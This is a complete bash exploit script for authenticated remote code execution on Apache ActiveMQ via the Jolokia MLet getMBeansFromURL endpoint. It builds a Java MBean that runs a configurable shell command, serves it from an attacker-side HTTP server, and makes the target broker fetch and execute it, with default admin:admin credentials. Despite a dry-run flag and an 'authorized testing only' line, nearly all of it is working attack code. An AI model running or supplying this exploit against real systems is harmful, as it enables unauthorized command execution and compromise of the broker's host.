#!/usr/bin/env bash
# activemq-jolokia-rce.sh — admin-auth RCE via Jolokia MBean loading.
#
# When you have admin web-console creds on ActiveMQ (admin:admin etc.), the
# Jolokia endpoint at /api/jolokia/ exposes the JMX bean surface. The standard
# RCE path is:
#   1. Have a remote HTTP server serving an .mlet file + accompanying MBean .jar
#      whose constructor calls Runtime.getRuntime().exec(...)
#   2. POST  /api/jolokia/exec/JMImplementation:type=MLet/getMBeansFromURL/<url>
#   3. The broker fetches the MLet, loads the .jar, instantiates the bean,
#      and the constructor runs your command.
#
# This script:
#   1. Auto-builds an MLet + a trivial MBean .jar with a configurable command
#   2. Starts a local HTTP server to host them
#   3. Triggers the load via authenticated Jolokia call
#   4. Cleans up on exit
#
# Requires: curl, python3, jar+javac (for building the MBean) OR a prebuilt .jar
# via --jar.
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
. "$SCRIPT_DIR/_activemq_lib.sh"

TARGET=""
USER="admin"; PASS="admin"
CMD="id; uname -a; touch /tmp/activemq-pwn"
LOCAL_IP=""
HTTP_PORT="${HTTP_PORT:-8765}"
JAR_PATH=""
KEEP_RUNNING=0
EXPLOIT=0

while [ $# -gt 0 ]; do
    case "$1" in
        --target)     TARGET="$2"; shift 2 ;;
        --user)       USER="$2"; shift 2 ;;
        --pass)       PASS="$2"; shift 2 ;;
        --cmd|-c)     CMD="$2"; shift 2 ;;
        --local-ip)   LOCAL_IP="$2"; shift 2 ;;
        --http-port)  HTTP_PORT="$2"; shift 2 ;;
        --jar)        JAR_PATH="$2"; shift 2 ;;
        --keep)       KEEP_RUNNING=1; shift ;;
        --exploit)    EXPLOIT=1; shift ;;
        -h|--help)
            cat <<EOF
Usage: $0 --target host:port --exploit [--user U] [--pass P] [--cmd 'sh'] [options]

Required:
  --target HOST:PORT       e.g. 10.0.0.5:8161 (web console)
  --exploit                REQUIRED to actually fire the chain. Without it the
                           script prints what it would do and exits 0.
                           Per CLAUDE.md §9 invariant 1.

Auth:
  --user (default: admin)  --pass (default: admin)

Exploit:
  --cmd 'sh-command'       command to run on victim (default: $CMD)
  --local-ip IP            attacker IP victim will fetch from (auto-detect if blank)
  --http-port PORT         http listener port (default: $HTTP_PORT)
  --jar PATH               use prebuilt MBean .jar instead of generating
  --keep                   leave HTTP server running after exploit fires
EOF
            exit 0 ;;
        *) err "unknown arg: $1"; exit 1 ;;
    esac
done

[ -z "$TARGET" ] && { err "--target required"; exit 1; }
parse_target "$TARGET"
[ -z "$PORT" ] && PORT=8161

if [ "$EXPLOIT" != 1 ]; then
    log "DRY RUN — would fire authenticated Jolokia MLet RCE against $HOST:$PORT"
    log "  user/pass:  $USER:$PASS"
    log "  cmd:        $CMD"
    log "  http-port:  $HTTP_PORT (MLet+jar stager)"
    log "  jar:        ${JAR_PATH:-(auto-build via javac/jar)}"
    log ""
    log "  Re-run with --exploit to load the MBean and execute the command as the broker user."
    log "  Authorized testing only."
    exit 0
fi

# Sanity probe
if ! jolokia_auth_works; then
    err "Jolokia auth failed for $USER:$PASS at http://$HOST:$PORT/api/jolokia/"
    err "Try: curl -u $USER:$PASS http://$HOST:$PORT/api/jolokia/version"
    exit 2
fi
hit "Jolokia auth OK as $USER"

# Stage workdir
WORKDIR=$(mktemp -d -t activemq-pwn.XXXXXX)
trap 'rm -rf "$WORKDIR"; [ -n "${HTTPD_PID:-}" ] && kill "$HTTPD_PID" 2>/dev/null || true' EXIT INT TERM

# Build MBean .jar if needed
if [ -z "$JAR_PATH" ]; then
    if ! have javac || ! have jar; then
        err "javac/jar not installed — install JDK or pass --jar prebuilt.jar"
        err "Standalone prebuilt jars exist in public PoCs but you should review their source before use."
        exit 3
    fi
    log "Building MBean .jar with embedded command..."
    cat > "$WORKDIR/SystemExec.java" <<JAVA
import javax.management.*;
import javax.management.loading.*;
public class SystemExec implements SystemExecMBean {
    public SystemExec() { run(); }
    public final void run() {
        try {
            Process p = new ProcessBuilder(new String[]{"/bin/bash","-c","${CMD//\"/\\\"}"}).start();
            p.waitFor();
        } catch (Exception ignored) {}
    }
}
JAVA
    cat > "$WORKDIR/SystemExecMBean.java" <<'JAVA'
public interface SystemExecMBean { public void run(); }
JAVA
    ( cd "$WORKDIR" && javac SystemExec.java SystemExecMBean.java && jar cf systemexec.jar SystemExec.class SystemExecMBean.class ) || {
        err "jar build failed"; exit 4
    }
    JAR_PATH="$WORKDIR/systemexec.jar"
fi
log "MBean jar: $JAR_PATH ($(stat -c%s "$JAR_PATH") bytes)"
cp "$JAR_PATH" "$WORKDIR/exec.jar"

# Write the MLet descriptor
cat > "$WORKDIR/exploit.mlet" <<MLET
<HTML>
<mlet code="SystemExec" archive="exec.jar" name="SystemExec:name=SystemExec"></mlet>
</HTML>
MLET
log "MLet file written"

# Find a local IP
if [ -z "$LOCAL_IP" ]; then
    LOCAL_IP=$(ip route get "$HOST" 2>/dev/null | awk '/src/ {for(i=1;i<=NF;i++) if($i=="src") print $(i+1)}' | head -1)
    [ -z "$LOCAL_IP" ] && LOCAL_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
fi
[ -z "$LOCAL_IP" ] && { err "could not auto-detect --local-ip"; exit 5; }

# Start HTTP server
log "Starting HTTP server on 0.0.0.0:$HTTP_PORT (serving $WORKDIR)"
( cd "$WORKDIR" && python3 -m http.server "$HTTP_PORT" >/dev/null 2>&1 ) &
HTTPD_PID=$!
sleep 0.5
if ! kill -0 "$HTTPD_PID" 2>/dev/null; then
    err "HTTP server failed to start (port in use?)"; exit 6
fi

MLET_URL="http://$LOCAL_IP:$HTTP_PORT/exploit.mlet"
log "MLet URL: $MLET_URL"

# Trigger
log "POSTing to JMImplementation:type=MLet/getMBeansFromURL"
ENC_URL=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$MLET_URL', safe=''))")
RESP=$(curl -sk -m 30 -u "$USER:$PASS" \
    -H 'Origin: http://localhost' \
    "$(jolokia_url)/exec/JMImplementation:type=MLet/getMBeansFromURL/$ENC_URL")
echo "$RESP" > "$WORKDIR/jolokia_response.json"

# Look for success — the response will contain ObjectInstance or error fields
if echo "$RESP" | grep -q '"status":200'; then
    hit "MBean loaded — your command ran in the broker JVM"
    echo "Response (truncated):"
    echo "$RESP" | head -c 1000
else
    err "Jolokia call returned unsuccessful status"
    echo "$RESP" | head -c 2000
    miss "Common causes:"
    miss "  - victim couldn't reach $MLET_URL (firewall/NAT)"
    miss "  - 'enable-module-command' style restriction on newer brokers"
    miss "  - SELinux/AppArmor blocked dlopen-equivalent"
fi

if [ "$KEEP_RUNNING" = "1" ]; then
    log "Keeping HTTP server alive (PID=$HTTPD_PID) — Ctrl-C to stop"
    wait "$HTTPD_PID"
fi
